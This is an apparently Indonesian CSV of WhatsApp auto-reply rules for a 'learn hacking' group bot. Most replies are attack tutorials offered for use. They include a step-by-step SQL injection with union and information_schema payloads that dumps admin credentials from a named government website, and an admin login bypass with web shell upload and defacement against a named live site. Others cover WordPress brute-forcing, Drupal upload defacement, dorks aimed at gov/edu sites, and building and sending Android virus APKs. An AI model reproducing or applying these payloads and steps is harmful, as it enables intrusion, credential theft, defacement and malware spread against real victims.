"received_message","pattern_matching","reply_message","multiple_replies","multiple_reply_delay","multiple_reply_delay_max","recipients","contacts","ignored_contacts","reply_delay","reply_delay_max","specific_times","monday","tuesday","wednesday","thursday","friday","saturday","sunday","pause_type","pause_value","disabled"
"devace sql","none","tutorial deface sql injection\n\n\n\n\nPada Tutorial Kali ini ,Saya akan Share Tutorial Deface Sql Manual\n\ndork : \n\n- inurl:/staff.php?id=\n\n- inurl:/news.php?id=\n\nkembangin sendiri gan.\n\n\nNah Langsung Aja Karena Saya Udah Nemu Situs Yang Vuln Sql ,Oh iya Untuk Mengetahui Vuln Atau Tidak Kalian Hanya Perlu Masukan tanda ( ' ) di belakang angka Id nya, Contoh :\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113' Nah Kek gitu deh, maka muncul You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1\n\n\n\njika sudah ketemu ,kalian tinggal masukan +order+by+1--+- ,Jadinya :\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+1--+-\n\nKalian Terusin Sampai Ketemu Error ,jadinya\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+1--+- => Ga error\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+2--+- Ga error\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+3--+- Ga error \n\nSampai eror ya gan, \n\n\n\n\n\n\nNah disini saya eror di http://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+9--+- Maka di Pastikan Table nya ada 8, Jika Sudah Gitu Kalian Tinggal ganti +order+by dengan +union+select,jangan lupa di kasih tanda (-) di depan angka id.\n\n\n\njadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+3--+- karena tadi table nya ada 8 http://www.utama.tegalkab.go.id/artikel.php?id=1+union+select+1,2,3,4,5,6,7,8--+- .Maka Akan Terlihat angka Ajaib Nya.\n\n\n\n\nSaya akan pilih Angka Dua Aja Biar Mesra wkwkwk.Sekarang Kita masukan inject nya .\ninject : (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)\nMasukan Pas di angka yang muncul Tadi ,\n\n\nJadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+1,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x),3,4,5,6,7,8,9,10--+- Nah Disini Kalian Akan Lihat Banyak Table Table, Carilah Table Yang ada username dan password nya, kalo gak admin.\n\n\n\n\nNah Jika Sudah Lihat, Kalian Tinggal Dump istilahnya, Atau Buka Table Caranya Dengan Masukan Inject : /*!50000(SELECT+GROUP_CONCAT(username,0x3a,password+SEPARATOR+0x3c62723e)+FROM+utenti)*/ \n\n\nDisini user dan password saya di Table admin.dan nama table adminnya admin_username. dan passwordnya admin_password. Jadi kalian edit inject nya jadi : /*!50000(SELECT+GROUP_CONCAT([user_id],0x3a,[user_pw]+SEPARATOR+0x3c62723e)+FROM+[securityTab])*/\n\nYang Saya Tandai [ ] Yang Harus Kalian Ganti.\n\n\nMaka Jadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+1,/*!50000(SELECT+GROUP_CONCAT(admin_username,0x3a,admin_password+SEPARATOR+0x3c62723e)+FROM+admin)*/,3,4,5,6,7,8,9,10--+-\n\nNanti Saat Kalian Buka ,Akan Muncul user + password .\n\n                                                                               \n\nTinggal kalian cari admin login nya hohoho :v","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace wpbf","none","Bahan-bahan\n1.face Gans\n2.hp,laptop,pc\n3.termux atau kali linux\n4.kuota ajg :v\n5.dork :intitle:/my blog my wordpress blog\n\nOke\nLanjut ketik script wpbf ini di terminal anda\npkg install git\npkg install python2\npkg install python2\ngit clone https://github.com/reyspeed/wpbf\ncd wpbf\npython2 wpbf.py -u https://target.com/wp-login.php -u admin -P pass.txt\n\nTidak semua user admin ya tod jadi untuk liat user web nya klean bisa tulis gini site.co.li/?author=1 nah biasanya muncul user web nya,,ok setelah bruteforce nanti pasword nya muncul","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"github grup","none","github.com/reyspeed\n\nKlik ajg","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk spam wa","none","https://m.apkpure.com/id/labalabi-for-whatsapp/labalabi.whatsapp/download-apk-info\n\nKlik ajg","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace regmem","none","Tutorial Deface PoC Bypass Admin + Tebas Index\n\nYa kembali lagi dengan saya Mr.SkyCoDe kali ini saya akan share tutorial deface poc Bypass admin + tebas index\n\nSebelumnya saya sudah menjelaskan apa itu deface maka langsung simak aja ya\n\nBahan :\n\n- Shell Backdoor\n\n- Script Deface\n\n- Dork :\n\n* inurl:/admin.php  intext:login intext:adminsitrator \n\n* inurl:/admin/index.php site:. \n\n* inurl :/admin/Admin.php intext:login \n\n* inurl:/administrator/login.php site:. \n\n* inurl:/login.php intext:administrator \n\n* inurl:/admin/login.php\n\n* inurl:/admin/login.php site:gov.my (atau apalah kreasikan sendiri) Use your brain ya seterusnya :'v \n\n- kesabaran :v \n\nLangsung saja  Kalian harus dorking di goggle missal\n\nDork : inurl:/admin/login.php site:in \n\nPilih salah satu web gue baik guee kasih live target :V https://www.drhelpdesk.in/admin/\n\nIsi username sama pw nya  ‘=’’or’  Jika gagal login berarti web tersebut tidak vuln bypass admin (cari lagi:v)  Jika berhasil maka akan di arahkan ke dashboard admin:v Jika sudah masuk ke dashboard admin cari tempat upload biasa nya di add news atau upload image  Tinggal upload shell nya lalu klik upload atau submit :D \n\nT E R U P L O A D >:( \n\nJika sudah upload shell nya tinggal panggil :D caranya klik kanan gambar rusak view image atau klo android tekan gambar yg  rusak view image atau copy url image :v  Kalo Sudah berhasil, masuk ke shell nya :D \n\n1. Sekarang tinggal tebas index caranya tinggal ke public_html \n\n2. Cari Index.php atau Index.html \n\n3. Lalu klik edit lalu klik oke \n\n4. Hapus semua lalu ganti dengan script deface kalian \n\n6. Lalu klik go atau save Mari kita lihat indexnya :D  cara nya = www.namasite.col.mek Tutorial Bypass Admin + Tebas Index:v","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dorking shell","none","DEVACE MENGGUNAKAN DORKING SHELL\n\nBahan²:\n1.Dork\n-intitle:index of cgi.php intext:""64k""\n-intitle:index of zoz.php intext:""64k""\n2.Shell\n3.Akses internet\n4.Hp/Pc\n5.Pacar,Oiya saiya kan joned:'( \n6.Kopi dan roko biar paru² selalu smile:)\n\nLangkah²:\n1.kalian dorking dlu ya gaes menggunakan dork yang diatas tadi dan kembangkan sesuai isi otak kalian:v\n\n2.kalo sudah kalian cari target nya gaes dan saya sudah nemu disini\n\n\n\n3.lalu kalian masuk ke target kalian kalo hoki kalian bisa nemu yg udah di tanem shell \n\n\n\n4.langsung saja kalian tebas ya gaes karna saya pengen nikung dlu jadi saya upload shell saya disitu lalu ganti menggunakan shell kalian\n\n\n5.lalu kalian cari index.php nya dan edit dan ganti isi nya menggunakan script deface kalian,karna di target saya gaada index.php nya jadi saya upload aja sendiri dan isi dalam nya script saya\n\n6.kalo sudah kalian save lalu tinggal panggil saja hasil tebas dan done ^_^\n\n7.oke cukup sampe disini saja","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"tentang bot","none","Bot ini khusus di buat untuk keperluan belajar hacking oleh author yaitu Rey","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"drupal hidden","none","DEFACE METODE DRUPAL HIDDEN UPLOADER\n\n\n\n\nHallo gaes kali ini gw akan memberikan tutorial deface metode drupal hidden uploader ok gausah banyak bacot langsung aja ke tutorialnya : V\nBAHAN"" : SCRIPT DEFACE\n                    DORK :\n\nAllowed file types: jpg html txt. site:gov\n\nAllowed file types: jpg html txt. site:edu\n\nAllowed file types: png gif jpg txt.\n\nsite:(Domain Negara yg diinginkan)\n\n                    KETAMPANAN: V\n                 \n1. Dorking dulu di google pake dork yang di atas & pilih target:v\n\n2. Kalau vuln muncul tempat upload\n\n\n\n3. Trus klik PILIH FILE & pilih script deface kesayangan kalian :V lalu klik UPLOAD\n\n\n\n4. Nah kan udah ke upload, di samping tulisan REMOVE kan ada nama script deface lu, truss klik dan BOOM langsung keDeface tinggal mirrorin deh:V\n\n\n\n\nSekian dulu tutorial DEFACE METODE DRUPAL HIDDEN UPLOADER Semoga bermanfaat & semoga kalian paham :V","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"#wts","none","Jangan promosi aja anjeng !","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"subs rey","none","https://www.youtube.com/channel/UCDWY5hUhbdhOsufx1cnp2ng\n\nDi subscribe ya hewkwr","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"arti bypass admin","none","Bypass Admin adalah teknik dimana queri sql dipaksa dimasukan pada form login yang nantinya akan dibaca oleh sistem sebagai sebuah queri sql pada umumnya. Karena intruksinya memaksa, jadi tanpa user&pass pun sistem akan memprosesnya. ","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk sandroproxy","none","https://m.apkpure.com/id/sandroproxy/org.sandroproxy/download?from=details\n\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"*","similar","Hai member grup kali ini kita untuk belajar menggunakan fitur bot (balasan otomatis) ketik menu untuk memulai bot.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apa itu termux","none","Termux adalah salah satu aplikasi android terminal emulator dan linux environtment yang dapat di gunakan tanpa root dan juga root.\n\nAda banyak kegunaan termux, tentu nya untuk mepermudah user dalam beraktivitas seperti menggunakan bot atau pesan otomatis, bermain game, hacking, seperti : hack situs/website atau biasa disebut juga dengan deface, hack medsos (media sosial), Facebook, Instagram, WhatsApp, hack cctv, hack Video Tron/Layar papan reklame jalan, mengendalikan Laptop/PC, hp, gadget, android/Smartphone orang lain baik jarak dekat maupun jarak jauh, membuat dan mengirimkan virus /Virtex yang dapat membuat hp, gadget, android/Smartphone sih penerima menjadi lambat-loading, lemot, lelet, dan WhatsAppnya keluar sendiri atau eror, membuat dan mengirimkan Spam mulai dari spam telfon, pesan : sms, chat, ngerjain teman dan lain sebagainya.\n\nJika kalian belum mempunyai aplikasi termux, Silahkan Klik-Link dibawah ini untuk mendownload aplikasi Termux :\nhttps://play.google.com/store/apps/details?id=com.termux\n\nPertama - tama kalian harus menginstall dan menjalankan commands/Perintah yang penting di bawah ini, agar semua tools dapat berjalan dengan lancar dan up to date, dan juga silahkan ikuti trik nya.\n\n*Trik Termux* ⓉⓔⓂⓐⓝ\n\nUntuk mematikan atau memberhentikan tools tekan tombol volume bawah (-) + C secara bersamaan.\n\nUntuk memunculkan commands/perintah sebelumnya tekan tombol volume bawah + P.\n\nMenampilkan Tombol *ESC, HOME, CTRL dan lainnya* Tekan Tombol volume atas + Q.\n\nKetik *clear* Untuk Membersihkan tampilan layar.\n\nKetik *exit* untuk keluar dari aplikasi Termux.\n\nKetik *cp* Untuk mengcopy suatu file.\n\nKetik *history* Untuk mengetahui perintah-perintah yang sudah digunakan sebelumnya.\n\n*Keterangan :*\n\n- *apt* dan *pkg* fungsinya sama, yang membedakan hanya tulisan, huruf dan bacaannya.\n\n- *&&* : untuk menggabungkan 2 perintah command-Termux.\n\n- *-y* : untuk melanjutkan penginstalan tools tanpa harus mengetik *y ( y/n ) yes or no*, dalam bahasa Indonesia : *ya atau tidak*.\n\n*Tanpa Root*\n\n*Memperbarui dan Meningkatkan Termux*\n$ pkg update && pkg upgrade\n\n*Tools pendukung yang di perlukan agar tools yang lain work. <----<* _PENTING_\n$ pkg install git php curl -y\n$ pkg install python2\n$ pkg install apache2\n\n*Catatan :* Jika ada pertanyaan saat install, silahkan ketik tombol y lalu enter saja, agar proses install dapat berjalan dengan lancar.\n\n*Menampilkan Matrix*\nIni cuma menampilkan *angka dan huruf* berjatuhan, terlihat keren.\n$ pkg install cmatrix\n$ cmatrix\n\n*Memunculkan gambar Kereta Api yang bergerak*\n$ pkg install sl\n$ sl\n\n*Bermain game*\n$ pkg install moon-buggy\n$ moon-buggy\n\n*Menampilkan Informasi System*\n$ pkg install neofetch\n$ neofetch\n_Untuk melihat Informasi memory_\n$ free\n\n*Membuat Tulisan atau Teks Besar di Terminal*\n$ pkg install figlet\n$ figlet TeMan \n$ ( nama kalian )\n\n*Menampilkan kalender*\n$ cal\n*atau*\n$ cal 2019 \n*Catatan:* jika kalian ingin melihat kalender tahun berikutnya atau sebelumnya kalian hanya tinggal mengubah tahunnya )\n*Untuk menampilkan jam bulan tahun*\n$ date\n\n*Menjalankan Musik di Termux*\n$ pkg install mpv\n$ mpv /lokasi/musik/musik.mp3\n\n*Cara mempercepat koneksi Internet*\n_Ketik perintah berikut ini, untuk mengetahui ip kalian_\n$ ifconfig\n_Setelah itu, akan muncul ip kalian, Silahkan salin IP kalian tersebut dengan menggunakan perintah di bawah ini._\n$ ping -s ipkalian\n\n_atau langsung saja ketik/salin command/perintah dibawah ini :_\n$ ping 8.8.8.8\n\nCara Mempercantik Tampilan Termux\n$ pkg update && pkg upgrade\n$ pkg install ruby cowsay toilet figlet\n$ pkg install neofetch\n$ gem install lolcat\n$ cd ../usr/etc\n$ nano bash.bashrc\n_Kalian tinggal menyalin kode berikut ini lalu menempelkannya :_\n\ncowsay -f eyes ""Nama"" | lolcat\ntoilet -f standard ""Nama"" -F gay\nneofetch\ndate | lolcat\n\nKemudian tekan *Volume bawah + X lalu ""y""* atau jika ada *CTRL* kalian bisa juga *CTRL + X lalu ""y""* dan *Enter*.Lalu coba kalian buka sesi baru dan hiasannya pun akan muncul.\n\n*Root ( Rooting )*\n\n*Untuk masuk mode root (Bila hp sudah di root)*\n$ apt install su\n$ su\n\n*Cara Install Wifite di Termux Android*\nWifite adalah salah satu tool yang berfungsi untuk wireless attack, seperti mengcrack atau membobol password wifi yang terkunci dengan wpa/wpa2.\n\n*Cara Install Wifite*\n$ git clone https://github.com/derv82/wifite\n$ cd wifite\n$ chmod 777 wifite.py\n\n*Cara Menjalankan Wifite*\n$ python2 wifite.py\n*atau*\n*Cara hack WiFi, hp harus di root terlebih dahulu*\n- Download aplikasi WiFi kill\n\n*Cara Membuat Virus Di Termux*\nInstall Python dan Git, dengan menggunakan perintah :\n$ pkg install python && pkg install git\n\nSelanjutnya yang terakhir, mari kita klon atau download script Vbug, dengan menggunakan perintah :\n$ git clone https://github.com/Junior60/vbug\n\n- Selanjutnya masuk kedalam direktori VBug, dengan menggunakan perintah :\n$ cd vbug\n\nSelanjutnya, jalankan tools VBug, dengan menggunakan perintah :_\n$ python2 vbug.py\n\n- Jika sudah muncul gambar, silahkan kalian enter.\n- Selanjutnya, kalian akan disuguhi 3 pilihan, yaitu Virus Android, Windows atau MacOS, pilih salah satu, disini saya akan membuat Virus Android yaitu memilih angka nomor 1, dengan menggunakan perintah :\n$ 1 lalu enter\n\n- Setelah itu, kalian akan disuguhi kembali pilihan Virus, silahkan kalian pilih salah satu, pilih sesuai huruf depan Virus, contoh Bootloop, berarti jika kalian ingin memilih Virus Android tersebut kalian tinggal mengetik huruf depannya yaitu : \n$ B lalu enter.\n\n- Selanjutnya, jika kalian ingin mengirim Virus tersebut, silahkan kalian pindahkan virus tersebut ke Penyimpanan Internal kalian, dengan menggunakan perintah :\n$ mv namavirus.apk /sdcard\n\n*Catatan :* Nama Virus Ada Saat Proses Pembuat Virus Menggunakan VBug.\n\n- Jika munvul ""permission denied"" silahkan izinkan Termux mengakses Penyimapanan Internal kalian, dengan menggunakan perintah :\n$ termux-setup-storage\n\n- Kalian tinggal mengirimkan Virus Android tersebut, ke target kalian dan suruh lah install virus tersebut lalu membukanya, maka virus tersebut akan berjalan.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"halo","similar","halo %name%","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"woi bot","none","_Ya ada apa?_<#>Butuh bantuan<#>Ketik *menu* untuk menampilkan semua keyword yang tersedia ✓","all","","","b","","","","","0","","","","","","","","seconds","0","0"
"wa gb","none","http://www.mediafire.com/file/kxfz7d4u3w6vdcm/GBWA.8.45F_By_FouadMODS.apk/file\n\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"heker","similar","STIKER MULU AJG","single","","","b","","","","","0","","","","","","","","seconds","0","0"
